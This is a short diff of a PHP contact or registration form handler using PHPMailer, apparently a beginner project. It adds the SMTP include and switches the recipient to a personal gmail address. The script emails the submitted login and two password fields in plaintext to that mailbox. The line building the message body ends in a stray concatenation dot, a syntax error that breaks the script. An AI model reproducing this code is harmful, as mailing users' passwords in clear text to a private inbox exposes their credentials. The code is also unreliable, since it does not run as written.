@@ -3,7 +3,7 @@
 
 	require "PHPMailer/Exception.php";
 	require "PHPMailer/PHPMailer.php";
-
+	require "PHPMailer/SMTP.php";		
 	$sendMessage = new PHPMailer(true);
 	$sendMessage->CharSet = 'UTF-8';
 	$name = $_POST["name"];
@@ -14,7 +14,7 @@
 	$body = $name. ' ' .$login. ' ' .$password1. ' ' .$password2.;
 	$sendMessage->Subject = 'Привет! Это "Фрилансер по жизни';
 
-	$sendMessage->addAddress('kaxa0308super@kaxadontstarve.github.io');
+	$sendMessage->addAddress('kaxa0308super@gmail.com');
 	$sendMessage->Body = $body;
 
 	$sendMessage->send();
